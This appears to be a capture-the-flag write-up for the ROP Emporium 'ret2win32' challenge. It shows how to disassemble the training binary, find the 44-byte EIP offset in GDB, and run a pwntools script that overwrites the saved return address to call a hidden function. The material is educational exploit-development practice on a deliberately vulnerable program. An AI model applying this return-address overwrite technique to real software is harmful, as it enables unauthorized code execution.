# ret2win32

Link: https://ropemporium.com/challenge/ret2win.html

Description: *Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack.*

--------------------------


## 1. Studying the binary

List functions with:

```
nm ret2win32 | grep 't'
```

![a](images/Screenshot_1.jpg)

Or with radare:

```
r2 ret2win32
aaaa
afl
```

![a](images/Screenshot_2.jpg)

Then we can disassembly this function using again radare:

```
r2 ret2win32
aaaa
s sym.ret2win
pdf
```

![a](images/Screenshot_3.jpg)

We can disassembly the main function too:

![a](images/Screenshot_4.jpg)


## 2. Calculating EIP overwrite offset

I will open GDB with GEF script:

```
gdb -q ./ret2win32
```

Using Python we create characters to test when it crashes:

![a](images/Screenshot_5.jpg)


With 45 we overwrite only 1 byte, so the offset is 44:

![a](images/Screenshot_6.jpg)

Note: It will be the same offset for all the 32 bits binaries of Rop Emporium.


## 3. Calling ret2win

We can find the function address with:

```
objdump -D ret2win32 | grep ret2win
```

![a](images/Screenshot_7.jpg)

This address can be found also using gdb (*info functions*).

![a](images/Screenshot_8.jpg)



## 4. Final exploit

The exploit code is then:

```
from pwn import *

context(arch='i386', os='linux')
p = process('./ret2win32')

junk =    "A"*44
ret2win = 0x08048659
rop = junk + p32(ret2win)
p.recvuntil("> ")
p.send(rop)
p.interactive()
```

The result:

![a](images/Screenshot_9.jpg)